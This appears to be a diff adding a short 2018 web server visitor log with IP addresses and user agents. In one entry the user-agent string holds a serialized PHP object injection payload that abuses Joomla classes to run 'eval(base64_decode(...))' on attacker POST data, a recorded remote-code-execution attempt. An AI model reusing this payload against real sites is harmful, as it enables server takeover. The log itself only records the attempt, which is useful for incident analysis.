@@ -1,0 +1,9 @@
+IP: 27.34.68.211 TIME: Jun 10 0:20:16 2018 REFERRER:  SEARCHSTRING:  USERAGENT: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
+IP: 27.34.68.211 TIME: Jun 10 0:23:48 2018 REFERRER:  SEARCHSTRING:  USERAGENT: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
+IP: 27.34.68.211 TIME: Jun 10 0:55:17 2018 REFERRER:  SEARCHSTRING:  USERAGENT: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
+IP: 27.34.20.197 TIME: Jun 10 1:45:24 2018 REFERRER:  SEARCHSTRING:  USERAGENT: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 Edge/16.16299
+IP: 13.57.220.0 TIME: Jun 10 2:19:59 2018 REFERRER:  SEARCHSTRING:  USERAGENT: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36
+IP: 103.5.150.130 TIME: Jun 10 2:31:18 2018 REFERRER:  SEARCHSTRING:  USERAGENT: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.181 Safari/537.36
+IP: 185.234.217.79 TIME: Jun 10 3:46:29 2018 REFERRER:  SEARCHSTRING:  USERAGENT: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)
+IP: 185.234.217.79 TIME: Jun 10 3:46:30 2018 REFERRER:  SEARCHSTRING:  USERAGENT: }__test|O:21:"JDatabaseDriverMysqli":3:{s:4:"\0\0\0a";O:17:"JSimplepieFactory":0:{}s:21:"\0\0\0disconnectHandlers";a:1:{i:0;a:2:{i:0;O:9:"SimplePie":5:{s:8:"sanitize";O:20:"JDatabaseDriverMysql":0:{}s:5:"cache";b:1;s:19:"cache_name_function";s:6:"assert";s:10:"javascript";i:9999;s:8:"feed_url";s:54:"eval(base64_decode($_POST[111]));JFactory::get();exit;";}i:1;s:4:"init";}}s:13:"\0\0\0connection";i:1;}𝌆
+IP: 185.234.217.79 TIME: Jun 10 3:46:30 2018 REFERRER:  SEARCHSTRING:  USERAGENT: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)
